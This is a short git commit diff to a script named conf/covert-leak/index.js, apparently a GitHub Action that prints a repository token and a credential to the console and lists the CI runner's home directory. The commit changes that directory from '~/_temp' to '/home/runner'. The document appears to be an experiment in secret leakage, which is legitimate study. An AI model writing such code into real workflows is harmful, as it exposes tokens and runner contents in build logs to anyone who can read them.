a3da58cccbf687883cef54a29e4c99af9245363b
igibek <koishybayev.igibek@gmail.com>
2021-02-22 08:45:20 -0500

    small changes

--- conf/covert-leak/index.js
+++ conf/covert-leak/index.js
@@ -12,7 +12,7 @@ try {
   
   console.log(repo, token);
   console.log('Credo', credo);
-  let listings = fs.readdirSync('~/_temp');
+  let listings = fs.readdirSync('/home/runner');
   console.log(listings);
 } catch (error) {
   core.setFailed(error.message);
